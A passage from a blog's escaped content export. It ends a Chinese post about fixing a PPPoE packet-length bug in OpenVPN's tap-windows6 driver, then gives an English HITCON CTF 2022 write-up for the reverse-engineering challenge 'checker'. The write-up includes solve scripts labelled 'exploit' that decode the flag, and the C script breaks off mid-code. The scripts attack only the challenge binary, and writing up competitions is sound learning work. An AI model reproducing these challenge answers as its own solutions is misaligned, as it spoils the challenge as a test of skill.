我看到一個有趣的東西。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/3e9f9647-44ac-4872-a42b-b65b514cf0ff\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/405c801d-7ab0-437b-a9f4-71b009815683\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這時我就聯想到 34 這個數字剛好是 ethernet header + ipv4 header 的長度，因此我馬上對整個專案搜尋 \u003ccode\u003eIP_HEADER_SIZE\u003c/code\u003e，會發現馬上就出現了一些很有趣的內容。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/37c75a9a-1e02-476c-884a-92e77a976b1a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e其中 \u003ccode\u003etxpath.c\u003c/code\u003e 上面的 \u003ccode\u003e\u0026lt; (ETHERNET_HEADER_SIZE + IP_HEADER_SIZE)\u003c/code\u003e 只是做分類而已，因此不影響重點是下面兩個。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/01ae29e9-2c36-4766-aa47-6aba8549500e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e首先我們可以很確定這個 function 是對 tap adapter 做處理，閱讀 function name \u003ccode\u003etapNetBufferListNetBufferLengthsValid\u003c/code\u003e 可以猜測這是驗證 packet 長度的 function，那問題來了，理論上 tap adapter 只要有 ethernet header 都可以傳的，那為何需要驗證 \u003ccode\u003eIP_HEADER_SIZE\u003c/code\u003e。\u003c/p\u003e\n\u003cp\u003e於是我把它改成這樣。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/706e5025-4c14-43c8-940f-41f1a2df6963\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e並且發了 \u003ca href=\"https://github.com/OpenVPN/tap-windows6/pull/159\"\u003ePR\u003c/a\u003e。\u003c/p\u003e\n\u003cp\u003e一個很有趣的小插曲是，在我還沒發現 code 有問題前我就有發 \u003ca href=\"https://github.com/OpenVPN/tap-windows6/issues/158\"\u003eissue\u003c/a\u003e 了，說 Packet lost for pppoe over openvpn tap，但是他們並沒有採信。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/1c28dab1-55a5-409c-ad49-8ada7e385cfe\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/5286b5c0-5c94-4ffa-9b94-52974d33bf0e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/2d9604df-c9f1-417f-a993-9fe032709a2e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e最後我找到問題並發了 \u003ca href=\"https://github.com/OpenVPN/tap-windows6/pull/159\"\u003ePR\u003c/a\u003e 他們才發覺真的有這問題。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/5cab908e-56c8-4a5e-a3e6-a56aaf6b5aaa\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/7b0bb026-6499-4629-b1b0-cfae6d982335\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e並且經過了一寫討論與測試並發布後，我測試完 PPPoE 就正常了。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/4378dfb8-8ab5-4f2f-8839-3f7741b12955\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/da3d5e33-18e8-4b23-b50f-a7c6ca1bc926\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/Chumy-Blog/assets/57281249/88ea778f-b45f-48c2-a0fb-993c473a8607\" alt=\"image\"\u003e\u003c/p\u003e\n","description":"","image":"/images/ovpn.png","permalink":"https://blog.chummydns.com/blogs/openvpn-patch/","title":"從 Wireshark 到 patch OpenVPN driver"},{"content":"\u003ch1 id=\"hitconctf-2022-writeup\"\u003ehitconctf-2022-writeup\u003c/h1\u003e\n\u003ch2 id=\"戰績\"\u003e戰績\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204162751-27c34090-7cab-418d-a0ec-0379f0e99436.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204162537-eb1eceec-010c-4b65-b228-5b43ec9535bb.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch2 id=\"checker\"\u003echecker\u003c/h2\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158150-d012979f-8227-450d-a458-be0d2ffa67f9.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eDisassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a \u0026ldquo;hitcon\u0026rdquo; at address 0x140003000.\u003c/p\u003e\n\u003cp\u003echecker.exe:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158308-726e9f4c-04f3-48de-b588-0a1f603af5a0.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003echecker_drv.sys:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158381-0616e107-20b6-4e4c-9fa7-6c7e6e5cf9fc.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eAlso, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.\u003c/p\u003e\n\u003cp\u003echecker_drv.sys:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158683-35f275c5-6d17-46f9-9082-908e0bfef896.png\" alt=\"image\"\u003e\n\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158704-5374f7af-1d8c-4dd9-9c76-1aa5ef62d02c.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eWhen the driver is loaded, it will first use the data from address 0x140001430 to 0x14000144A to change the hexadecimal data at address 0x14001B30.\u003c/p\u003e\n\u003cp\u003echecker_drv.sys:\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://user-images.githubusercontent.com/57281249/204158746-cdac8ff7-2d75-4ba7-8dcf-363da013e6b3.png\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eWe need to send these codes in a specific order to get the correct flags.\u003c/p\u003e\n\u003cp\u003eWe can find the order by choosing the code that makes the disassembly of function 0x14001B30 valid.\u003c/p\u003e\n\u003cp\u003eThe order is 0x222070u,0x222020u,0x222060u,0x222000u,0x222010u,0x222040u,0x222030u,0x222050u\u003c/p\u003e\n\u003cp\u003eThen use the function we got to calculate the hex for addresses 0x140003000 to 0x14000302A and then we can get the flags.\u003c/p\u003e\n\u003ch3 id=\"exploit\"\u003eExploit\u003c/h3\u003e\n\u003ch4 id=\"exploit1\"\u003eexploit1\u003c/h4\u003e\n\u003cp\u003eUse exploit1 to choose the order of codes.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esourcedata3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efromhex(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;80E92280F1AD0FB6C16BC811B89E0000\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata3188 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efromhex(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;40534883EC20488B053B0C0000488BDA488B4A104839087537488B4A08FF151D\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata3178 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003efromhex(\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;19BC8F82D02C6134C09FF650D5FB0C6ED0EBE5E3CEB54CCA45AA11B23E626F7DD0EBA9E3B22F06477C28C5DEDE1A4ED6D82D934F826564FD08624B877E524730B7BAD039685350AB20D5CA8426716F911B364611A5F14E586C74D49C15E228D5D90F3D83F3FCD1131A621240AAEACDCBE1C6088198F66888BE23B59E55B9E27D5ADA3907F02E322059564CB48F3E0761D90F2D61F1913314CB4968FE1FD48AFEE1C618639A9B8A8A7F08C3E8E1EC0B8F3B0094A511E74766C49F981870F030F69471B195D1F06FB7D93D059EC15333769B4B69CADEFD7D67B8292BC7C5842CD18787F1989774AD4B32F04A5172EA09F738FD27BD1C527143959C1A86F2C0F9F8\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(sourcedata3180)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e32\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    data3180[a\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e data3180[a\u003cspan style=\"color:#f92672\"\u003e%\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data3188[a]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esourcedata3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(data3180)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;usage: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e \u0026lt;index 0(0~7)\u0026gt; \u0026lt;index 1\u0026gt;  \u0026lt;index 2\u0026gt; ...\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eorder\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e[ int(a) \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e:len(sys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv)] ]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecodes\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003elist(range(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;index \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(i) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e i \u003cspan style=\"color:#f92672\"\u003e\u0026gt;=\u003c/span\u003e len(order):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e now \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            data3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(sourcedata3180)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                data3180[a] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e data3180[a] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data3178[now\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e a]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            print(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;try \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e str(now) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e bytes(data3180)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehex())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        x \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e int(input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select code (0~7): \u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e\u0026lt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003eand\u003c/span\u003e x \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e7\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e            x\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eint(input(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;select code (0~7): \u0026#34;\u003c/span\u003e))\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        order\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(x)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    data3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytearray(sourcedata3180)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        data3180[a] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e data3180[a] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data3178[order[i]\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e a]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    print(str(order[i]) \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;: \u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e bytes(data3180)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ehex())\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e range(\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e,\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e):\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        data3180[a] \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e data3180[a] \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e data3178[order[i]\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e0x20\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x10\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e a]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    sourcedata3180 \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e bytes(data3180)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"exploit2\"\u003eexploit2\u003c/h4\u003e\n\u003cp\u003eUse exploit2 for get flag.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-C\" data-lang=\"C\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;stdio.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#include\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\u0026lt;string.h\u0026gt;\u003c/span\u003e\u003cspan style=\"color:#75715e\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define _BYTE unsigned char\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define __int64 long long\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#define __int8 char\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etypedef\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003e__int64\u003c/span\u003e (\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003efunc)(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc0\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e result; \u003cspan style=\"color:#75715e\"\u003e// rax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e8\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e a1) \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e (a1 \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc1\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e a1 \u003cspan style=\"color:#f92672\"\u003e^\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0x26u\u003c/span\u003e;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc2\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003e__int8\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e result; \u003cspan style=\"color:#75715e\"\u003e// rax\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e (\u003cspan style=\"color:#ae81ff\"\u003e16\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e a1) \u003cspan style=\"color:#f92672\"\u003e|\u003c/span\u003e (a1 \u003cspan style=\"color:#f92672\"\u003e\u0026gt;\u0026gt;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e result;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc3\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e a1)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e (\u003cspan style=\"color:#66d9ef\"\u003eunsigned\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)(a1 \u003cspan style=\"color:#f92672\"\u003e+\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e55\u003c/span\u003e);\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003e__int64\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efunc4\u003c/span\u003e(\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e 